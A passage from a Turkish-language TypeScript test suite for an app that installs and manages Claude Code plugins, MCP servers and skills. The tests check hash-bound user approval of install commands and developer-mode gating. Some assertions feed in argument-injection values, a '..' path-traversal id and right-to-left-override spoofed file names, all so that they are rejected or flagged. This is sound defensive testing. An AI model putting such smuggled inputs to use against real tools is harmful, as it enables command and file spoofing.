  assert.equal(yeni.paketDurumu().ogeler.find((o) => o.id === 'context7')?.hal, 'sirada', 'yarıda kalan kuyruğa döner');
  assert.equal(yeni.paketDurumu().adimGoruldu, true);
});

test('kurulum komutu ONAYSIZ çalışmaz: komut ve sha256 gösterilir; ret → kurulmaz; yanlış özet → reddedilir; onay → --accept-command <sha>; asla -y', async () => {
  const s = senaryo({ SAHTE_CC_KOMUTLU: 'context7' });
  s.k.paketBaslat(['context7', 'superpowers']);
  await s.bitti();
  const o = hal(s.k, 'context7')!;
  assert.equal(o.hal, 'onay');
  assert.equal(o.onay?.komut, 'npm install -g @sahte/context7-yardimci');
  assert.equal(o.onay?.sha256, sha256(Buffer.from('npm install -g @sahte/context7-yardimci')));
  assert.equal(hal(s.k, 'superpowers')?.hal, 'kuruldu', 'onay bekleyen öteki kurulumları durdurmaz');
  assert.ok(!s.claudeKayit().some((a) => a.includes('--accept-command')), 'onaysız --accept-command verildi');
  asla_y(s.claudeKayit());
  assert.ok(s.bildirimler.some((b) => /onayını bekliyor/.test(b)));
  // Yanlış özetle onay reddedilir (komut çalışmaz).
  const yanlis = await s.k.onay('context7', 'b'.repeat(64), true);
  assert.equal(yanlis.tamam, false);
  assert.ok(!s.claudeKayit().some((a) => a.includes('--accept-command')));
  // Ret: kurulmaz.
  assert.equal((await s.k.onay('context7', o.onay!.sha256, false)).tamam, true);
  assert.equal(hal(s.k, 'context7')?.hal, 'reddedildi');
  assert.equal((await s.k.liste('eklenti', true)).liste?.some((e: { id?: string }) => e.id === 'context7@claude-plugins-official'), false);
  // Yeniden dene → yine onay ister; onay → --accept-command <sha>.
  await s.k.ogeKur('context7');
  await s.bitti();
  assert.equal(hal(s.k, 'context7')?.hal, 'onay');
  const r = await s.k.onay('context7', o.onay!.sha256, true);
  assert.equal(r.tamam, true, JSON.stringify(r));
  assert.equal(hal(s.k, 'context7')?.hal, 'kuruldu');
  const kabul = s.claudeKayit().filter((a) => a.includes('--accept-command'));
  assert.equal(kabul.length, 1);
  assert.deepEqual(kabul[0], ['plugin', 'install', 'context7@claude-plugins-official', '-s', 'user', '--accept-command', o.onay!.sha256, '--json']);
  asla_y(s.claudeKayit());
  const gunluk = fs.readFileSync(s.k.gunlukYolu, 'utf8');
  assert.match(gunluk, /context7: kurulum komutu REDDEDİLDİ/);
  assert.match(gunluk, /context7: kurulum komutu ONAYLANDI/);
});

test('onaylanan komut değişmişse kurulmaz ve yeniden onay ister (değişen sha256)', async () => {
  const s = senaryo({ SAHTE_CC_KOMUTLU: 'serena', SAHTE_CC_KOMUT_DEGISIR: 'serena' });
  s.k.paketBaslat(['serena']);
  await s.bitti();
  const ilk = hal(s.k, 'serena')!.onay!;
  const r = await s.k.onay('serena', ilk.sha256, true);
  assert.equal(r.tamam, false);
  const o = hal(s.k, 'serena')!;
  assert.equal(o.hal, 'onay');
  assert.notEqual(o.onay?.sha256, ilk.sha256);
  assert.match(o.ileti ?? '', /değişti/);
  assert.equal((await s.k.liste('eklenti', true)).liste?.length, 0);
});

test('Claude Code yokken seçim BEKLER; "Claude Code\'u kur" (sahte yükleyici, görünür pencere yerine gizli) → claude.exe bulununca kaldığı yerden sürer', async () => {
  const s = senaryo({ FUBER_CLAUDE_KURULU_DENETIM: '1', FUBER_CC_YUKLEYICI_KOMUT: JSON.stringify([node, betik('sahte-yukleyici.mjs')]), FUBER_CLAUDE_GIZLI: '1', SAHTE_YUKLEYICI_MS: '250', FUBER_SAHTE_YUKLEYICI_KAYIT: path.join(tmp, 'yukleyici.jsonl') });
  assert.equal((await s.k.durum()).claude.kurulu, false);
  s.k.paketBaslat(['superpowers', 'context7']);
  await bekleKosul(() => !s.k.paketDurumu().calisiyor, 10_000);
  assert.deepEqual(s.k.paketDurumu().ogeler.map((o) => o.hal), ['bekliyor', 'bekliyor']);
  assert.equal(s.k.paketDurumu().claudeBekleniyor, true);
  assert.equal(s.claudeKayit().length, 0, 'Claude Code yokken claude çalıştı');
  assert.ok(s.bildirimler.some((b) => /Claude Code kurulunca/.test(b)));
  const r = s.k.ccKur();
  assert.equal(r.tamam, true, JSON.stringify(r));
  // Düzeltme turu 1, madde 4: ikinci tık ikinci bir yükleyici AÇMAZ (aşağıda yükleyici kaydı tek satır).
  const r2 = s.k.ccKur();
  assert.equal(r2.tamam, true);
  assert.match(r2.ileti ?? '', /zaten açık/);
  assert.equal((await s.k.durum()).claude.yukleyiciAcik, true);
  await bekleKosul(() => s.k.paketDurumu().ogeler.every((o) => o.hal === 'kuruldu'), 30_000, 'Claude Code kurulunca paket sürdü');
  assert.ok(fs.existsSync(path.join(s.ev, '.local', 'bin', 'claude.exe')));
  const d = await s.k.durum();
  assert.equal(d.claude.kurulu, true);
  assert.equal(d.claude.yukleyiciAcik, undefined);
  assert.equal(d.claude.girisYapildi, true);
  assert.equal(satirlar(path.join(tmp, 'yukleyici.jsonl')).length, 1);
  delete process.env.FUBER_CLAUDE_KURULU_DENETIM; delete process.env.FUBER_CC_YUKLEYICI_KOMUT;
  s.k.kapat();
});

test('Graphify becerisi zaten varsa atlanır (uv indirilmez); uv kurulumu düşerse Graphify hata, katalog sürer', async () => {
  const s = senaryo();
  fs.mkdirSync(path.join(s.claude, 'skills', 'graphify'), { recursive: true });
  fs.writeFileSync(path.join(s.claude, 'skills', 'graphify', 'SKILL.md'), '---\nname: graphify\n---\n');
  const once = sunucu.istekler.length;
  s.k.paketBaslat(['graphify']);
  await s.bitti();
  assert.equal(hal(s.k, 'graphify')?.hal, 'kurulu');
  assert.equal(sunucu.istekler.length, once);
  const s2 = senaryo({ SAHTE_UV_DUS: '1' });
  s2.k.paketBaslat(['graphify', 'playwright']);
  await s2.bitti();
  assert.equal(hal(s2.k, 'graphify')?.hal, 'hata');
  assert.match(hal(s2.k, 'graphify')?.ileti ?? '', /Graphify kurulamadı \(uv\)/);
  assert.equal(hal(s2.k, 'playwright')?.hal, 'kuruldu');
});

test('Eklentiler sekmesi: listeler; aç/kapat/kaldır/güncelle; MCP kaldır (eklentininki reddedilir); beceri çöpe; Graphify kaldır; katalogda ara ve kur', async () => {
  const s = senaryo({ SAHTE_CC_KURULU: 'superpowers,context7' });
  fs.mkdirSync(path.join(s.claude, 'skills', 'benim-becerim'), { recursive: true });
  fs.writeFileSync(path.join(s.claude, 'skills', 'benim-becerim', 'SKILL.md'), '---\nname: benim-becerim\ndescription: Kendi becerim\n---\n');
  const e = (await s.k.liste('eklenti', true)).liste as { id: string; paketteMi: boolean; etkin: boolean; mcp: string[] }[];
  assert.deepEqual(e.map((x) => [x.id, x.paketteMi, x.etkin]), [['superpowers@claude-plugins-official', true, true], ['context7@claude-plugins-official', true, true]]);
  assert.deepEqual(e[1].mcp, ['context7']);
  const b = (await s.k.liste('beceri')).liste as { ad: string; aciklama: string }[];
  // Gösterilen yol ev klasörüne göre kısaltılır ("~\.claude\skills\…"; kullanıcı adı ekranda görünmez).
  assert.deepEqual(b, [{ ad: 'benim-becerim', aciklama: 'Kendi becerim', yol: path.join('~', '.claude', 'skills', 'benim-becerim'), kaynak: 'kullanici' }]);
  assert.match((((await s.k.liste('eklenti')).liste as { yol?: string }[])[0].yol ?? ''), /^~[\\/]\.claude[\\/]plugins/);
  const mcp = (await s.k.liste('mcp', true)).liste as { ad: string; kaldirilabilir: boolean }[];
  assert.deepEqual(mcp.map((x) => [x.ad, x.kaldirilabilir]), [['sahte-dosyalar', true], ['eski-sunucu', true], ['plugin:context7:context7', false]]);
  const kat = (await s.k.liste('katalog', true)).liste as { id: string; kurulu: boolean }[];
  assert.ok(kat.length >= 20);
  assert.equal(kat.find((x) => x.id === 'superpowers@claude-plugins-official')?.kurulu, true);
  assert.equal((await s.k.islem({ tur: 'eklenti', id: 'context7@claude-plugins-official', islem: 'kapat' })).tamam, true);
  assert.equal(((await s.k.liste('eklenti')).liste as { id: string; etkin: boolean }[]).find((x) => x.id.startsWith('context7'))?.etkin, false, 'önbellek işlemden sonra tazelenir');
  assert.equal((await s.k.islem({ tur: 'eklenti', id: 'context7@claude-plugins-official', islem: 'ac' })).tamam, true);
  assert.equal((await s.k.islem({ tur: 'eklenti', id: 'superpowers@claude-plugins-official', islem: 'guncelle' })).tamam, true);
  assert.equal((await s.k.islem({ tur: 'eklenti', id: 'superpowers@claude-plugins-official', islem: 'kaldir' })).tamam, true);
  assert.equal(((await s.k.liste('eklenti')).liste as unknown[]).length, 1);
  assert.equal((await s.k.islem({ tur: 'mcp', id: 'plugin:context7:context7', islem: 'kaldir' })).tamam, false);
  assert.equal((await s.k.islem({ tur: 'mcp', id: 'eski-sunucu', islem: 'kaldir' })).tamam, true);
  assert.deepEqual(((await s.k.liste('mcp')).liste as { ad: string }[]).map((x) => x.ad), ['sahte-dosyalar', 'plugin:context7:context7']);
  // Argüman enjeksiyonu: '-' ile başlayan kimlik / ad reddedilir.
  assert.equal((await s.k.islem({ tur: 'eklenti', id: '--help', islem: 'kaldir' })).tamam, false);
  assert.equal((await s.k.islem({ tur: 'mcp', id: '-s', islem: 'kaldir' })).tamam, false);
  assert.equal((await s.k.ogeKur('--yes@x')).tamam, false);
  assert.equal((await s.k.islem({ tur: 'beceri', id: '..', islem: 'kaldir' })).tamam, false);
  assert.equal((await s.k.islem({ tur: 'beceri', id: 'benim-becerim', islem: 'kaldir' })).tamam, true);
  assert.deepEqual(s.cop, [path.join(s.claude, 'skills', 'benim-becerim')]);
  // Katalogda ara ve kur (paket dışı).
  const k1 = await s.k.ogeKur('linear@claude-plugins-official');
  assert.equal(k1.tamam, true, JSON.stringify(k1));
  // Graphify: kur, sonra kaldır (graphify claude uninstall + uv tool uninstall graphifyy).
  s.k.paketBaslat(['graphify']);
  await s.bitti();
  assert.equal(hal(s.k, 'graphify')?.hal, 'kuruldu');
  const g = await s.k.islem({ tur: 'graphify', id: 'graphify', islem: 'kaldir' });
  assert.equal(g.tamam, true, JSON.stringify(g));
  assert.ok(!fs.existsSync(path.join(s.claude, 'skills', 'graphify')));
  assert.deepEqual(s.graphifyKayit().map((x: { argv: string[] }) => x.argv), [['install', '--platform', 'windows'], ['claude', 'uninstall']]);
  assert.deepEqual(s.uvKayit().filter((x: { argv: string[] }) => x.argv[1] === 'uninstall').map((x: { argv: string[] }) => x.argv), [['tool', 'uninstall', 'graphifyy']]);
  assert.equal(hal(s.k, 'graphify'), undefined);
  asla_y(s.claudeKayit());
});

test('paket: seçimden çıkarılan (henüz kurulmamış) öğe kuyruktan düşer; boş seçim yalnız adımı "görüldü" işaretler, hiçbir komut çalışmaz', async () => {
  const s = senaryo();
  const d = s.k.paketBaslat([]);
  assert.equal(d.adimGoruldu, true);
  assert.deepEqual(d.ogeler, []);
  await uyu(150);
  assert.equal(s.claudeKayit().length, 0);
  assert.equal(s.bildirimler.length, 0);
});

test('İş modunda hiçbir etki yok: paket isteği yok sayılır, tekil kurulum / işlem / yükleyici reddedilir, bekleyen kuyruk sürmez, bildirim yok', async () => {
  let gelistirici = false;
  const s = senaryo({}, { etkin: () => gelistirici });
  const d = s.k.paketBaslat(['superpowers']);
  assert.equal(d.adimGoruldu, false);
  assert.deepEqual(d.ogeler, []);
  for (const r of [await s.k.ogeKur('superpowers'), await s.k.ogeKur('linear@claude-plugins-official'), await s.k.islem({ tur: 'eklenti', id: 'x@y', islem: 'kaldir' }), await s.k.onay('superpowers', 'a'.repeat(64), true), s.k.ccKur()]) {
    assert.equal(r.tamam, false);
    assert.match(r.hata ?? '', /yalnız Developer mode’da/);
  }
  // Geliştirici'de kuyruğa alınıp İş'e geçilen öğe İş'te sürmez; Geliştirici'ye dönünce surdur() kaldığı yerden kurar.
  gelistirici = true;
  const dosya = path.join(s.veri, 'claudecode', 'gelistirici-paketi.json');
  fs.mkdirSync(path.dirname(dosya), { recursive: true });
  fs.writeFileSync(dosya, JSON.stringify({ surum: 1, adimGoruldu: true, ogeler: [{ id: 'superpowers', hal: 'sirada' }] }));
  gelistirici = false;
  const k2 = new EklentiKurucu({ veriDizini: path.join(s.veri, 'claudecode'), araclarDizini: path.join(s.veri, 'araclar'), claudeDizini: () => s.claude, etkin: () => gelistirici, bildir: (b) => s.bildirimler.push(b) });
  k2.surdur();
  await (await k2.durum());
  await uyu(200);
  assert.equal(k2.paketDurumu().ogeler[0].hal, 'sirada');
  assert.equal(s.claudeKayit().filter((a) => a[1] === 'install').length, 0, 'İş modunda kurulum çalıştı');
  gelistirici = true;
  k2.surdur();
  await bekleKosul(() => k2.paketDurumu().ogeler[0].hal === 'kuruldu', 20_000, 'Geliştirici\'de sürdü');
  assert.equal(s.bildirimler.length, 0, 'yalnız paketBaslat bildirim ister (sürdürme sessiz)');
});

// ══════════════════ Düzeltme turu 1 ══════════════════
test('madde 1 (uçtan uca): uzun komut ve başka eklentinin komutu onaya SUNULMAZ ("kurulmadı"), onaylanamaz; arşivli komutun adresi saklanır', async () => {
  const s = senaryo({ SAHTE_CC_KOMUTLU: 'context7,serena,playwright,linear', SAHTE_CC_KOMUT_TURU: 'context7:uzun,serena:baska,playwright:bidi+arsiv,linear:uzun' });
  s.k.paketBaslat(['context7', 'serena', 'playwright', 'superpowers']);
  await s.bitti();
  assert.equal(hal(s.k, 'context7')?.hal, 'hata');
  assert.equal(hal(s.k, 'context7')?.ileti, 'Bu eklentinin kurulum komutu burada gösterilemeyecek kadar uzun; kurulmadı.');
  assert.equal(hal(s.k, 'context7')?.onay, undefined, 'kısaltılmış komut saklandı');
  assert.equal(hal(s.k, 'serena')?.hal, 'hata');
  assert.match(hal(s.k, 'serena')?.ileti ?? '', /başka bir eklentiye ait \(baska-eklenti@claude-plugins-official\); kurulmadı/);
  const p = hal(s.k, 'playwright')!;
  assert.equal(p.hal, 'onay');
  assert.equal(p.onay?.tur, 'entry_helper');
  assert.equal(p.onay?.pluginId, 'playwright@claude-plugins-official');
  assert.equal(p.onay?.arsivAdresi, 'https://ornek.example/arsiv/playwright-1.0.0.tgz?imza=\u{202E}zip.exe', 'arşiv adresi kısaltılmadan, görünmeyen karakteriyle (arayüz işaretler) saklanır');
  assert.equal(p.onay?.komut, 'node ./yardimci/basliklar.js \u{202E}txt.ini');
  assert.equal(p.onay?.katalogSurumu, 'sahte-rev-1');
  assert.equal(hal(s.k, 'superpowers')?.hal, 'kuruldu');
  // Onay sunulmayanlar onaylanamaz (--accept-command hiç verilmez).
  assert.match((await s.k.onay('context7', 'b'.repeat(64), true)).hata ?? '', /Onay bekleyen bir kurulum yok/);
  assert.match((await s.k.onay('serena', 'b'.repeat(64), true)).hata ?? '', /Onay bekleyen bir kurulum yok/);
  // Katalogdan tekil kurulum da aynı kural.
  const t = await s.k.ogeKur('linear@claude-plugins-official');
  assert.deepEqual([t.tamam, t.onay, t.hata], [false, undefined, 'Bu eklentinin kurulum komutu burada gösterilemeyecek kadar uzun; kurulmadı.']);
  assert.ok(!s.claudeKayit().some((a) => a.includes('--accept-command')));
  asla_y(s.claudeKayit());
  // Saklı kayıt: eski sürümün kısaltılmış / kimliksiz onayı geri YÜKLENMEZ (kuyruğa döner: komut yeniden ve tam sorulur); tamı yüklenir.
  const dosya = path.join(s.veri, 'claudecode', 'gelistirici-paketi.json');
  const kayit = JSON.parse(fs.readFileSync(dosya, 'utf8'));
  kayit.ogeler.push({ id: 'github', hal: 'onay', onay: { komut: 'x'.repeat(4000), sha256: 'e'.repeat(64) } }, { id: 'serena', hal: 'onay', onay: { komut: 'npm i', sha256: 'e'.repeat(64), pluginId: 'baska@claude-plugins-official' } });
  kayit.ogeler = kayit.ogeler.filter((o: { id: string }) => o.id !== 'serena' || o.hal === 'onay');
  fs.writeFileSync(dosya, JSON.stringify(kayit));
  const yeni = new EklentiKurucu({ veriDizini: path.join(s.veri, 'claudecode'), araclarDizini: path.join(s.veri, 'araclar'), claudeDizini: () => s.claude });
  const h = (id: string) => yeni.paketDurumu().ogeler.find((o) => o.id === id);
  assert.deepEqual([h('github')?.hal, h('github')?.onay], ['sirada', undefined]);
  assert.deepEqual([h('serena')?.hal, h('serena')?.onay], ['sirada', undefined]);
  assert.equal(h('playwright')?.hal, 'onay');
  assert.equal(h('playwright')?.onay?.arsivAdresi, p.onay?.arsivAdresi);
});

test('madde 2: seçim yüklenmeden gelen seçimsiz istek (null / undefined / dizi değil) kuyruğu SİLMEZ ve adımı işaretlemez', async () => {
  try {
    const s = senaryo({ FUBER_CLAUDE_KURULU_DENETIM: '1' });
    s.k.paketBaslat(['superpowers', 'context7']);
    await bekleKosul(() => !s.k.paketDurumu().calisiyor, 10_000);
    assert.deepEqual(s.k.paketDurumu().ogeler.map((o) => [o.id, o.hal]), [['superpowers', 'bekliyor'], ['context7', 'bekliyor']]);
    for (const bos of [null, undefined, 'superpowers', { secim: [] }]) {
      const d = s.k.paketBaslat(bos);
      assert.deepEqual(d.ogeler.map((o) => o.id), ['superpowers', 'context7'], `seçimsiz istek (${JSON.stringify(bos)}) kuyruğu sildi`);
    }
    const dosya = JSON.parse(fs.readFileSync(path.join(s.veri, 'claudecode', 'gelistirici-paketi.json'), 'utf8'));
    assert.deepEqual(dosya.ogeler.map((o: { id: string }) => o.id), ['superpowers', 'context7']);
    // Açık boş seçim ([]) yine "hiçbiri" demektir.
    assert.deepEqual(s.k.paketBaslat([]).ogeler, []);
  } finally { delete process.env.FUBER_CLAUDE_KURULU_DENETIM; }
  const t = senaryo();
  const d = t.k.paketBaslat(null);
  assert.equal(d.adimGoruldu, false, 'seçimsiz istek adımı "görüldü" saydı');
});

// Birleşim turu sertleştirmesi (2e): teklif kartının "Şimdi değil"i = değişiklik yok.
test('"Şimdi değil" (adimGorulduIsaretle): adım görüldü olur, bitmemiş kuyruk öğeleri DÜŞMEZ, kurulum başlamaz; İş modunda etkisiz', async () => {
  try {
    const s = senaryo({ FUBER_CLAUDE_KURULU_DENETIM: '1' });
    s.k.ogeKur('superpowers');
    s.k.ogeKur('context7');
    await bekleKosul(() => !s.k.paketDurumu().calisiyor && s.k.paketDurumu().ogeler.every((o) => o.hal === 'bekliyor'), 10_000, 'bekliyor');
    assert.equal(s.k.paketDurumu().adimGoruldu, false);
    const d = s.k.adimGorulduIsaretle();
    assert.equal(d.adimGoruldu, true);
    assert.deepEqual(d.ogeler.map((o) => [o.id, o.hal]), [['superpowers', 'bekliyor'], ['context7', 'bekliyor']], '"Şimdi değil" bitmemiş kuyruğu düşürdü');
    const dosya = JSON.parse(fs.readFileSync(path.join(s.veri, 'claudecode', 'gelistirici-paketi.json'), 'utf8'));
    assert.deepEqual([dosya.adimGoruldu, dosya.ogeler.length], [true, 2]);
    assert.equal(s.claudeKayit().length, 0);
    const is = senaryo({}, { etkin: () => false });
    assert.equal(is.k.adimGorulduIsaretle().adimGoruldu, false, 'İş modunda yazıldı');
  } finally { delete process.env.FUBER_CLAUDE_KURULU_DENETIM; }
  // Arayüz: kart boş seçim GÖNDERMEZ (kaynakta; önizleme ayrıca uçtan uca denetler).
  const kart = fs.readFileSync(path.join(kok, 'src', 'renderer', 'claudecode', 'AraclarTeklifi.tsx'), 'utf8');
  assert.match(kart, /'claudecode:paket-baslat', \{ yalnizGoruldu: true \}/);
  assert.doesNotMatch(kart, /secim: \[\]/);
});

test('madde 3: onaylanan güncelleme özgün kapsamında (-s) çalışır', async () => {
  const s = senaryo({ SAHTE_CC_KURULU: 'superpowers', SAHTE_CC_GUNCELLEME_KOMUTLU: 'superpowers' });
  const r = await s.k.islem({ tur: 'eklenti', id: 'superpowers@claude-plugins-official', islem: 'guncelle', kapsam: 'project' });
  assert.equal(r.tamam, false);
  assert.ok(r.onay, JSON.stringify(r));
  assert.deepEqual(s.claudeKayit().filter((a) => a[1] === 'update')[0], ['plugin', 'update', 'superpowers@claude-plugins-official', '-s', 'project', '--json']);
  const o = await s.k.onay('superpowers@claude-plugins-official', r.onay!.sha256, true);
  assert.equal(o.tamam, true, JSON.stringify(o));
  const kabul = s.claudeKayit().filter((a) => a.includes('--accept-command'));
  assert.deepEqual(kabul, [['plugin', 'update', 'superpowers@claude-plugins-official', '-s', 'project', '--accept-command', r.onay!.sha256, '--json']]);
  asla_y(s.claudeKayit());
});

test('madde 5: kullanıcının "graphify-notlar" becerisi kendisi olarak çöpe taşınır (Graphify kaldırılmaz); uv komut klasörü okunamazsa graphify hiç çalıştırılmaz', async () => {
  const s = senaryo();
  for (const ad of ['graphify', 'graphify-notlar', 'GraphifyYardim']) {
    fs.mkdirSync(path.join(s.claude, 'skills', ad), { recursive: true });
    fs.writeFileSync(path.join(s.claude, 'skills', ad, 'SKILL.md'), `---\nname: ${ad}\n---\n`);
  }
  const b = (await s.k.liste('beceri', true)).liste as { ad: string; kaynak: string }[];
  assert.deepEqual(b.map((x) => [x.ad, x.kaynak]).sort(), [['graphify', 'graphify'], ['graphify-notlar', 'kullanici'], ['GraphifyYardim', 'kullanici']].sort());
  const r = await s.k.islem({ tur: 'beceri', id: 'graphify-notlar', islem: 'kaldir' });
  assert.equal(r.tamam, true, JSON.stringify(r));
  assert.deepEqual(s.cop, [path.join(s.claude, 'skills', 'graphify-notlar')]);
  assert.deepEqual(s.graphifyKayit(), [], 'kullanıcı becerisi için graphify claude uninstall çalıştı');
  assert.ok(fs.existsSync(path.join(s.claude, 'skills', 'graphify', 'SKILL.md')), 'Graphify\'ın becerisi silindi');
  // uv'nin komut klasörü okunamıyor: Graphify kaldırma hiçbir komut çalıştırmaz, elle temizliği söyler.
  const s2 = senaryo({ SAHTE_UV_BIN_DUS: '1' });
  const g = await s2.k.islem({ tur: 'graphify', id: 'graphify', islem: 'kaldir' });
  assert.equal(g.tamam, false);
  assert.match(g.hata ?? '', /kaldırma komutu çalıştırılmadı.*\/hooks.*~\/\.claude\/skills\/graphify.*graphify\.exe/);
  assert.deepEqual(s2.graphifyKayit(), [], 'komut klasörü yokken graphify çalıştırıldı');
  assert.ok(!s2.uvKayit().some((x: { argv: string[] }) => x.argv[1] === 'uninstall'));
  // Kurulumda da: komut klasörü okunamazsa `graphify install` çalıştırılmaz.
  s2.k.paketBaslat(['graphify']);
  await s2.bitti();
  assert.equal(hal(s2.k, 'graphify')?.hal, 'hata');
  assert.match(hal(s2.k, 'graphify')?.ileti ?? '', /komut klasörü okunamadı/);
  assert.deepEqual(s2.graphifyKayit(), []);
  // Fuber'in uv'si silinmiş (uygulama veri klasöründe uv yok, sahtesi de yok): yine hiçbir şey çalışmaz.
  const yedek = process.env.FUBER_UV_KOMUT;
  delete process.env.FUBER_UV_KOMUT;
  try {
    const s3 = senaryo();
    const g3 = await s3.k.islem({ tur: 'graphify', id: 'graphify', islem: 'kaldir' });
    assert.equal(g3.tamam, false);
    assert.match(g3.hata ?? '', /Fuber’in uv’si silinmiş; kaldırma komutu çalıştırılmadı/);
    assert.deepEqual(s3.graphifyKayit(), []);
  } finally { process.env.FUBER_UV_KOMUT = yedek; }
});

test('madde 5: graphify yalnız uv\'nin komut klasöründen — klasör bilinmiyorsa ya da orada yoksa null (PATH\'e ve ~/.local/bin\'e düşülmez)', () => {
  const d = path.join(tmp, 'gyolu');
  const bin = path.join(d, 'uvbin'), yerel = path.join(d, 'ev', '.local', 'bin');
  fs.mkdirSync(bin, { recursive: true }); fs.mkdirSync(yerel, { recursive: true });
  fs.writeFileSync(path.join(yerel, 'graphify.exe'), 'başka bir graphify');
  assert.equal(graphifyYolu(null), null);
  assert.equal(graphifyYolu(bin), null, 'klasörde yokken başka yere düşüldü');
  fs.writeFileSync(path.join(bin, process.platform === 'win32' ? 'graphify.exe' : 'graphify'), 'x');
  assert.equal(graphifyYolu(bin), path.join(bin, process.platform === 'win32' ? 'graphify.exe' : 'graphify'));
  const kaynak = fs.readFileSync(path.join(kok, 'src', 'main', 'claudecode', 'eklenti-kurucu.ts'), 'utf8');
  assert.doesNotMatch(kaynak, /exe:\s*'graphify'/, 'çıplak graphify komutuna düşüş kaldı');
});

// ── Görev 7 (0.10) + K8: Graphify'ın kancası bozuksa (kanca settings.json'da, çağıracağı graphify yok) yalnız o zaman hata hâli ──────────
const kancaYaz = (claude: string, komut: string) => fs.writeFileSync(path.join(claude, 'settings.json'), JSON.stringify({
  enabledPlugins: { 'superpowers@claude-plugins-official': true },
  hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: 'echo baska' }] }, { matcher: 'Grep|Glob', hooks: [{ type: 'command', command: komut }] }] },
}));
test('G7: graphifyDenetle — settings.json’da graphify kancası + komut yok → sorun; komut varsa yok; Fuber’in uv ortamına bağlı kısayolun ortamı silindiyse sorun', () => {
  const d = path.join(tmp, 'gdenetim');
  const claude = path.join(d, 'ev', '.claude'), bin = path.join(d, 'ev', '.local', 'bin'), araclar = path.join(d, 'veri', 'araclar');
  fs.mkdirSync(claude, { recursive: true }); fs.mkdirSync(bin, { recursive: true });
  const denetle = () => graphifyDenetle({ claudeDizini: claude, araclarDizini: araclar, komutDizinleri: [path.join(d, 'yok'), bin] });
  assert.deepEqual(denetle(), { kanca: false, calistirilabilir: false }, 'settings.json yok');
  fs.writeFileSync(path.join(claude, 'settings.json'), '{ bozuk json');
  assert.equal(denetle().kanca, false, 'bozuk settings.json: kanca yok sayılır (yazılmaz)');
  kancaYaz(claude, 'echo graphify-notlar');
  assert.equal(denetle().kanca, false, '"graphify-notlar" Graphify’ın komutu değil');
  kancaYaz(claude, 'graphify claude-hook --event pre-tool');
  assert.deepEqual(denetle(), { kanca: true, calistirilabilir: false });
  // Komut klasöründe graphify.exe var: çalıştırılabilir.
  const exe = path.join(bin, process.platform === 'win32' ? 'graphify.exe' : 'graphify');
  fs.writeFileSync(exe, 'MZ… sıradan bir graphify');
  assert.deepEqual(denetle(), { kanca: true, calistirilabilir: true });
  // uv kısayolu Fuber'in uv ortamındaki Python'u gösteriyor; ortam (uygulama veri klasörü) silinmiş → çalıştırılamaz.
  const py = path.join(araclar, 'uv-araclar', 'graphifyy', 'Scripts', 'python.exe');
  fs.writeFileSync(exe, Buffer.concat([Buffer.from('MZ\0\0kalip\0'), Buffer.from(py, 'utf8'), Buffer.from([0, 0, 0, 0]), Buffer.from('UVUV')]));
  assert.deepEqual(denetle(), { kanca: true, calistirilabilir: false }, 'ortamı silinmiş kısayol');
  fs.mkdirSync(path.dirname(py), { recursive: true }); fs.writeFileSync(py, 'x');
  assert.deepEqual(denetle(), { kanca: true, calistirilabilir: true }, 'ortam yerinde');
  // UTF-16 ile gömülü yol da tanınır.
  fs.rmSync(py);
  fs.writeFileSync(exe, Buffer.concat([Buffer.from('MZ\0\0'), Buffer.from(py, 'utf16le'), Buffer.from('\0\0')]));
  assert.equal(denetle().calistirilabilir, false, 'UTF-16 yol');
  // Kancada mutlak yol: o dosya aranır (komut klasörlerine bakılmaz).
  fs.rmSync(exe);
  const mutlak = path.join(d, 'baska', 'graphify.exe');
  kancaYaz(claude, `"${mutlak}" claude-hook`);
  assert.deepEqual(denetle(), { kanca: true, calistirilabilir: false });
  fs.mkdirSync(path.dirname(mutlak), { recursive: true }); fs.writeFileSync(mutlak, 'x');
  assert.deepEqual(denetle(), { kanca: true, calistirilabilir: true });
  // Denetim settings.json'a YAZMAZ.
  assert.match(fs.readFileSync(path.join(claude, 'settings.json'), 'utf8'), /claude-hook/);
});

test('G7: durum() Graphify denetimini taşır (seçenek verildiyse); M3 (veri klasörü silindi) → "Yeniden kur" ATLANMAZ, uv tool install --force ile onarır; onarım düşerse sorun sürer', async () => {
  const s0 = senaryo();
  assert.equal((await s0.k.durum()).graphify, undefined, 'seçenek yoksa alan yok');
  // Komut klasörü: geçici evin ~/.local/bin'i (sahte uv, gerçeği gibi, kısayolu oraya yazar ve içine uv ortamındaki Python'un yolunu koyar).
  let ev = '';
  const s = senaryo({}, { graphifyKomutDizinleri: () => [path.join(ev, '.local', 'bin')] });
  ev = s.ev;
  const uvKurulumlari = () => s.uvKayit().filter((x: { argv: string[] }) => x.argv[0] === 'tool' && x.argv[1] === 'install').map((x: { argv: string[] }) => x.argv);
  s.k.paketBaslat(['graphify']);
  await s.bitti();
  assert.equal(hal(s.k, 'graphify')?.hal, 'kuruldu');
  assert.deepEqual(uvKurulumlari(), [['tool', 'install', 'graphifyy==0.9.95']], 'ilk kurulum --force OLMADAN (başkasının graphify.exe’si ezilmez)');
  kancaYaz(s.claude, 'graphify claude-hook');
  assert.deepEqual((await s.k.durum()).graphify, { kanca: true, calistirilabilir: true }, 'kanca + kısayol + ortam yerinde');
  // M3: Fuber'in uygulama veri klasörü (uv, uv ortamı) silindi; ~/.local/bin/graphify.exe ve kanca duruyor.
  fs.rmSync(path.join(s.veri, 'araclar'), { recursive: true, force: true });
  assert.ok(fs.existsSync(path.join(s.ev, '.local', 'bin', 'graphify.exe')));
  assert.deepEqual((await s.k.durum()).graphify, { kanca: true, calistirilabilir: false }, 'kısayol duruyor ama gösterdiği ortam yok');
  // Onarım düşerse (uv kuramadı): yine tek öğe, "hata"; sorun sürer.
  const istekOnce = sunucu.istekler.length;
  process.env.SAHTE_UV_DUS = '1';
  await s.k.ogeKur('graphify');
  await s.bitti();
  delete process.env.SAHTE_UV_DUS;
  assert.equal(hal(s.k, 'graphify')?.hal, 'hata');
  assert.equal(s.k.paketDurumu().ogeler.filter((o) => o.id === 'graphify').length, 1);
  assert.deepEqual((await s.k.durum()).graphify, { kanca: true, calistirilabilir: false });
  // "Yeniden kur": beceri var diye atlanmaz; uv yeniden iner (SHA-256), `uv tool install --force graphifyy==0.9.95` (kısayol başka ortamı
  // gösterdiği için --force olmadan gerçek uv "Executable already exists" der — sahte de öyle).
  await s.k.ogeKur('graphify');
  await s.bitti();
  assert.equal(hal(s.k, 'graphify')?.hal, 'kuruldu', 'sorunlu kanca: beceri var diye atlanmadı');
